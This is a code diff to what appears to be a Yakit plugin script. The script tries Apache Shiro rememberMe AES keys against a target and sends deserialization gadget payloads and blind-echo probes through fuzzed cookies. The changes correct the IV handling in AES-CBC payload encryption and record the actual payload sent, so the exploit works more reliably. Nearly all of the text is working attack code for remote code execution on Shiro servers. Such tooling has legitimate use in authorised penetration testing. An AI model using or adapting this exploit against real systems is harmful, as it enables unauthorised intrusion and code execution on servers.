@@ -200,7 +200,8 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
             if err{
                 continue
             }
-            result,err = enc(keyDecoded, data, nil)
+            iv = []byte(randstr(16))
+            result,err = enc(keyDecoded, data, iv)
             if err{
                 continue
             }
@@ -216,7 +217,7 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
                 })
             }else{
                   cookie = append(cookie, {
-                    "cookie": codec.EncodeBase64(append(keyDecoded, result...)),
+                    "cookie": codec.EncodeBase64(append(iv, result...)),
                     "key": key,
                     "aes-mode": encItem.name,
                 })
@@ -229,12 +230,17 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
 
     for _, cookieElement := range cookie {
         yakit_output(sprintf("Shiro Try KEY: %v for %v", cookieElement["key"], url))
+
         result = freq.FuzzCookie(shiroCookieKey, cookieElement["cookie"]).ExecFirst(httpool.https(isHttps))[0]
+
         if result == nil||result.Error != nil {
             yakit_output("FAILED for %v=%v", shiroCookieKey, cookieElement["cookie"])
             continue
         }
         headers, _ = str.SplitHTTPHeadersAndBodyFromPacket(result.ResponseRaw)
+
+        yakit.Info("del %v", headers)
+
         if headers == "" {
             continue
         }
@@ -293,14 +299,15 @@ mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*
                             enD,_ = codec.AESGCMEncrypt(keyDecoded, findGadgetDataBytes, nil)
                             payload =  codec.EncodeBase64(append(enD))
                         }else{
-                            enD,_ = codec.AESCBCEncrypt(keyDecoded, findGadgetDataBytes, nil)
-                            payload =  codec.EncodeBase64(append(keyDecoded, enD...))
+                            iv = []byte(randstr(16))
+                            enD,_ = codec.AESCBCEncrypt(keyDecoded, findGadgetDataBytes, iv)
+                            payload =  codec.EncodeBase64(append(iv, enD...))
                         }
                         res = freq.FuzzCookie(shiroCookieKey, payload).ExecFirst(httpool.https(isHttps))[0]
 
                         findGadGetDetail := {
                             "shiro_cookie_key": shiroCookieKey,
-                            "payload": cookieElement["cookie"],
+                            "payload": payload,
                             "shiro_key": cookieElement["key"],
                             "shiro_aes_mode": cookieElement["aes-mode"],
                             "request": res.RequestRaw,
@@ -400,14 +407,15 @@ blindEcho = func (bs64key,mode,shiroCookieKey,freq,isHttps) {
                 }
                 payload = codec.EncodeBase64(append(encodePayload))
             }else{
-                encodePayload,err = codec.AESCBCEncrypt(keyDecoded, payloadPadding, nil)
+                iv = []byte(randstr(16))
+                encodePayload,err = codec.AESCBCEncrypt(keyDecoded, payloadPadding, iv)
                 if err{
                     continue
                 }
                 if encodePayload ==nil{
                     continue
                 }
-                payload = codec.EncodeBase64(append(keyDecoded, encodePayload...))
+                payload = codec.EncodeBase64(append(iv, encodePayload...))
             }
 
             echoKey = randstr(6)
